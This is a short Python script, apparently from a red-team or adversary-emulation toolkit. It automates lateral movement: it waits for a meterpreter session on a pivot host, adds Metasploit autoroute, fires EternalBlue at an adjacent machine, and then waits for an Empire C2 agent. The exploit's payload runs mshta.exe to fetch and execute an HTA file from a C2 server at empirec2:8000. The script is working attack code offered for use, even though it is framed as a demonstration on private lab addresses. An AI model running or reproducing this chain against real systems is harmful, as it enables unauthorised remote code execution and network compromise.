"""
This procedure script demonstrates lateral Remote Code Execution:
1. Waiting for initial meterpreter sesion from pivot node (.191)
2. Start MSF autoroute on pivot node
3. Launch EternalBlue thru pivot to adjacent target (.196)
4. Starts an Empire agent from earlier step

In reality, one would perform a scan after step 2 & check if target is vulnerable
"""
from c2_settings import *
from EmpireAPIWrapper import empireAPI
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session, empire_wait_for_agent
from stage3.internal_c2.windows import msf_autoroute
from stage3.escalate_privilege.windows import msf_eternal_blue


# Set both API instances for MSF & Empire
client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)

# Set targets
pivot_address = '192.168.181.191'
target_address = '192.168.181.196'

# wait for meterpreter
msf_session_id = msf_wait_for_session.run(client, pivot_address)
msf_autoroute.run(client, msf_session_id)
cmd = 'mshta.exe http://empirec2:8000/o.hta'
msf_eternal_blue.run(client, target_address, cmd)

# wait for high_integrity empire agent
empire_agent = empire_wait_for_agent.run(API, target_address, True)
print(empire_agent)